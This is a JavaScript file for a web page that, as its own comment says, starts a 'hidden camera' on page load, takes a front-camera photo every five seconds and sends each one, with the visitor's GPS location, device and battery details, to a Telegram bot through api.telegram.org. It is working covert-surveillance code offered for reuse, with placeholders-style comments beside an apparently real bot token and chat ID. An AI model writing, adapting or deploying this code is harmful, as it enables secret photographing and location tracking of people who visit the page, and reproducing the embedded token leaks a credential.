const BOT_TOKEN = '7941135502:AAHz-KGvAAoZEhPVgfVKw3zFbkaB0_Pi5rM';  // 🔴 Replace with your Telegram Bot Token
const CHAT_ID = '878604830';      // 🔴 Replace with your Telegram Chat ID
let stream;

async function startCamera() {
  try {
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
    }

    const constraints = {
      video: {
        facingMode: "user", // 📌 Always use front camera
        width: { ideal: 1280 }, // 🔄 Adjust for smaller file size
        height: { ideal: 720 }
      }
    };

    stream = await navigator.mediaDevices.getUserMedia(constraints);
    document.getElementById('video').srcObject = stream;

    setInterval(captureAndSendPhoto, 5000); // 📌 Capture every 5 seconds
  } catch (err) {
    console.error("Camera access error:", err);
  }
}

function captureAndSendPhoto() {
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const context = canvas.getContext('2d');

  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  context.drawImage(video, 0, 0, canvas.width, canvas.height);

  canvas.toBlob(blob => {
    if (blob) {
      sendToTelegram(blob);
    }
  }, 'image/jpeg', 0.5); // 📌 Reduce quality for smaller size
}

async function sendToTelegram(blob) {
  const formData = new FormData();
  formData.append('chat_id', CHAT_ID);
  formData.append('photo', blob, 'photo.jpg');

  // Collect device & location data
  const deviceData = {
    userAgent: navigator.userAgent,
    screenSize: `${screen.width}x${screen.height}`,
    battery: await getBatteryLevel(),
    location: await getLocation()
  };

  formData.append('caption', JSON.stringify(deviceData, null, 2));

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: 'POST',
    body: formData
  }).catch(error => console.error('Telegram Error:', error));
}

async function getBatteryLevel() {
  if ('getBattery' in navigator) {
    const battery = await navigator.getBattery();
    return `${(battery.level * 100).toFixed(0)}%`;
  }
  return "Unknown";
}

async function getLocation() {
  return new Promise(resolve => {
    navigator.geolocation.getCurrentPosition(
      pos => resolve(`Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}, Accuracy: ${pos.coords.accuracy}m`),
      err => resolve("Location not available")
    );
  });
}

// Start hidden camera on page load
startCamera();
